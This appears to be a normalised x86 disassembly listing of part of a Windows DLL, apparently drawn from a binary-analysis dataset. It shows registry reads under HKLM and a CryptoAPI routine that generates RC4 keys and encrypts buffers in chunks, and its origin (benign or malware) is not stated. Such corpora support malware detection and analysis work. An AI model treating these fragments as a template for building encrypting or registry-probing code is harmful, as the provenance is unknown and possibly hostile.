push 0x20119
push esi
lea ecx [ ebp - 0x52c ]
push ecx
push 0x80000002
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0x954 ]
push edx
mov edx [ ebp - 0x934 ]
lea eax [ ebp - 0x92c ]
push eax
push esi
push esi
lea ecx [ ebp - 0x54 ]
push ecx
push edx
mov [ ebp - 0x954 ] 0x1fe
call ebx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x934 ]
push eax
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov ecx [ ebp - 0x948 ]
mov esi [ StrStrIW@IAT ]
push ecx
lea edx [ ebp - 0x324 ]
push edx
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x950 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax 0x1b
call sub_10049e00
mov ebx [ ebp - 0x944 ]
lea edx [ ebp - 0x92c ]
push edx
lea eax [ ebp - 0x324 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx 0x104
call sub_1002cb70
add esp 0xc
push eax
lea eax [ ebp - 0x324 ]
push eax
call esi
test eax eax
je r-xdata
sub_1000831a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10069ac6
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10024fe9
int3
sub_1000834a
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_100083d4
push 0x28
mov eax sub_1008552b
call sub_100624bc
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1001ceed
mov [ esi ] r--data
jmp r-xdata
sub_10008470
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10087900
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
movzx eax [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov [ esp + 0x20 ] edi
mov [ esp + 0x10 ] eax
jne r-xdata
lea eax [ esp + 0x24 ]
push eax
mov ecx esi
call sub_10013950
push eax
mov [ esp + 0x7c ] 0x0
call sub_10002fc0
mov [ esp + 0x7c ] 0xffffffff
mov edi [ esp + 0x28 ]
add esp 0x4
mov [ esp + 0x18 ] eax
test edi edi
je r-xdata
movzx ecx [ ebp + 0x1c ]
mov edx [ ebx ]
mov edx [ edx + 0x1c ]
push ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push esi
push eax
push ecx
push edi
mov ecx ebx
call edx
mov eax edi
jmp r-xdata
xor ecx ecx
mov [ esp + 0x44 ] 0x7
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] cx
mov [ esp + 0x78 ] 0x1
cmp [ ebp + 0x1c ] cl
je r-xdata
push 0x0
lea ecx [ esp + 0x2c ]
mov [ esp + 0x18 ] edi
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x18
lea ecx [ esp + 0x4c ]
push ecx
mov ecx [ esp + 0x1c ]
call sub_100194f0
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x7c ] 0x3
call sub_100649e0
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] 0x8
jb r-xdata
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x4c ]
push edx
call sub_10042810
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x7c ] 0x2
call sub_100649e0
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] 0x8
jb r-xdata
mov edi [ edi + 0x4 ]
neg edi
sbb edi edi
lea ecx [ esp + 0x28 ]
not edi
call sub_10069747
and edi [ esp + 0x14 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ esi + 0x24 ] 0x0
mov edi [ esi + 0x20 ]
mov ecx [ esp + 0x40 ]
jl r-xdata
mov edx [ esp + 0x4c ]
push edx
mov eax [ esp + 0x4c ]
push eax
jmp r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ edi + 0x4 ] eax
xor edi edi
jg r-xdata
call sub_100187af
add esp 0x4
cmp [ esp + 0x44 ] 0x8
mov eax [ esp + 0x30 ]
jae r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
push edx
push eax
lea ecx [ esp + 0x38 ]
push ecx
push ebx
call sub_10070c30
mov edx [ eax ]
mov ecx [ esp + 0x58 ]
mov [ ebp + 0xc ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp edi ecx
jbe r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x10 ]
push eax
push ecx
push edx
lea eax [ esp + 0x28 ]
push eax
push ebx
call sub_10016400
mov ecx [ eax ]
xor edx edx
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push edi
mov [ esi + 0x20 ] edx
mov [ esi + 0x24 ] edx
mov edx [ esp + 0x2c ]
mov esi [ esp + 0x3c ]
push edx
push eax
push ecx
push esi
push ebx
mov [ ebp + 0x10 ] eax
call sub_10070c30
add esp 0x30
cmp [ esp + 0x44 ] 0x8
jb r-xdata
lea eax [ esp + 0x30 ]
sub edi ecx
jmp r-xdata
mov eax esi
mov eax [ esp + 0x30 ]
push eax
call sub_100187af
add esp 0x4
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_100086ba
push ebp
mov ebp esp
sub esp 0x1c
push ebx
xor ebx ebx
push ebx
push 0x1
push r--data
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x3e8
mov [ ebp - 0x18 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push 0x8003
push [ ebp - 0xc ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x800001
push 0x6801
push [ ebp - 0xc ]
call [ CryptGenKey@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0xc ]
push eax
call sub_100375b7
jmp r-xdata
pop edi
pop esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x14 ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push 0x8
push ebx
push [ ebp - 0x8 ]
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push [ ebp - 0x14 ]
call [ CryptDestroyHash@IAT ]
mov [ ebp - 0x14 ] ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x800000
push [ ebp - 0x14 ]
push 0x6801
push [ ebp - 0xc ]
call [ CryptDeriveKey@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
mov ebx [ GetProcessHeap@IAT ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ ebp + 0x10 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0x8 ]
call [ CryptDestroyKey@IAT ]
push 0x3e8
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp + 0xc ] eax
cmp eax ebx
je r-xdata
xor ebx ebx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x0
push 0x8
push 0x0
push [ ebp - 0x8 ]
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0xc ]
call [ CryptReleaseContext@IAT ]
mov [ ebp + 0x13 ] 0x0
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov eax [ edi ]
add eax 0x4
push eax
push [ esi ]
push 0x8
call ebx
push eax
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
mov eax [ esi ]
add eax [ ebp + 0x8 ]
push [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ebx [ ebp + 0xc ]
push eax
call sub_1002e8d0
mov eax [ ebp - 0x10 ]
pop ecx
pop ecx
push eax
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
movzx eax [ ebp + 0x13 ]
push ebx
push 0x0
push eax
push 0x0
push [ ebp - 0x8 ]
call [ CryptEncrypt@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0x13 ] 0x1
mov [ ebp - 0x10 ] eax
add [ edi ] 0x4
mov eax [ edi ]
add eax [ ebp - 0x4 ]
push eax
push [ esi ]
push 0x8
call ebx
push eax
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
push [ ebp + 0xc ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x1c ]
push ebx
mov ebx [ esi ]
add ebx [ ebp + 0x8 ]
add ebx [ ebp - 0x18 ]
call sub_1002e8d0
push [ ebp - 0x10 ]
mov ebx [ ebp + 0xc ]
call sub_10064fa0
add esp 0xc
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ edi ] ecx
mov eax [ edi ]
mov edx [ esi ]
sub eax ecx
sub eax 0x4
push eax
push edx
lea ebx [ edx + ecx + 0x4 ]
call sub_1002e8d0
mov eax [ ebp - 0x4 ]
mov ebx [ esi ]
add eax 0x4
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x4 ]
push 0x4
push eax
call sub_1002e8d0
push [ ebp - 0x4 ]
mov ebx [ esi ]
push [ ebp + 0x10 ]
add ebx 0x4
call sub_1002e8d0
add esp 0x18
push [ ebp + 0x10 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
inc [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x3e8
jmp r-xdata
mov ecx [ ebp + 0x14 ]
imul ecx [ ebp - 0x10 ]
mov eax [ edi ]
sub eax ecx
sub eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
sub_10008999
push 0x4
mov eax sub_10085f06
call sub_100624bc
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
je r-xdata
push ebx
push eax
mov ecx esi
call sub_1005925e
mov eax esi
call sub_10013ab8
retn 0xc
lea edi [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x10
jb r-xdata
cmp eax ebx
ja r-xdata
push edi
push [ ebp + 0x10 ]
add ecx eax
push [ ebp + 0xc ]
push ecx
push edx
call sub_10058916
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push ebx
push eax
mov ecx esi
call sub_1005925e
mov edx [ esi + 0x14 ]
cmp edx 0x10
jb r-xdata
sub_10008a60
push ebp
mov ebp esp
push 0xffffffff
push sub_10086f11
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x24
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0x24
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_100404a0
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x20 ]
mov [ esi + 0x20 ] edx
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_10008adc
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_10024fe9
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10070ff0
add esi 0x24
cmp esi edi
jne r-xdata
sub_10008b19
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_1004a330
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_1004a330
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_1004a330
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_1004a330
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_1004a330
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
push 0x2
cmp eax ebx
mov [ ebp - 0x4 ] eax
pop ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] ebx
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0xc ]
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ebx [ ebp - 0xc ]
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1006c9ca
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1006c9ca
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
mov ebx [ ebp - 0x8 ]
cmp [ ebp + 0x12 ] bx
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1006c9ca
or [ esi ] eax
add esp 0x18
dec [ ebx ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1006c9ca
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
movzx ecx [ ebp + 0x12 ]
movzx eax bx
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1006c9ca
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1006c9ca
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
sub_10008fd9
push 0x8
push r--data
call sub_1007fb20
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_100202bc
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_10006f82
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_10013143
push 0x214
push 0x1
call sub_10067d3a
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_100356ae
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_10037d5b
mov [ rw-data ] eax
call sub_1002405f
test eax eax
jns r-xdata
call sub_10003f38
jmp r-xdata
call sub_1007fb65
retn 0xc
xor eax eax
inc eax
push edi
call sub_1003fa7a
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_10035965
call sub_1003944a
test eax eax
js r-xdata
call sub_100281cd
jmp r-xdata
push esi
call sub_10035d06
pop ecx
jmp r-xdata
push edi
push esi
call sub_1002be1e
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100090b2
jmp r-xdata
call sub_1003ccd1
call sub_100281cd
call sub_10003f38
call sub_1003ccd1
jmp r-xdata
call sub_10057713
test eax eax
js r-xdata
push 0x0
call sub_10055aed
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10009140
push ebp
mov ebp esp
sub esp 0x410
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ecx ecx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x408 ] ecx
mov eax ecx
xor edx edx
div edi
mov [ ecx * 4 + rw-data ] ecx
inc ecx
movzx eax [ edx + esi ]
mov [ ebp + ecx * 4 - 0x408 ] eax
cmp ecx 0x100
jl r-xdata
mov [ ebp - 0x40c ] ecx
lea ecx [ ebp - 0x404 ]
push ecx
lea ebx [ ebp - 0x40c ]
lea edi [ ebp - 0x408 ]
lea edx [ ebp - 0x410 ]
call sub_10023250
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100091c8
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10041a47
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1006299d
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1006299d
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10017e52
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
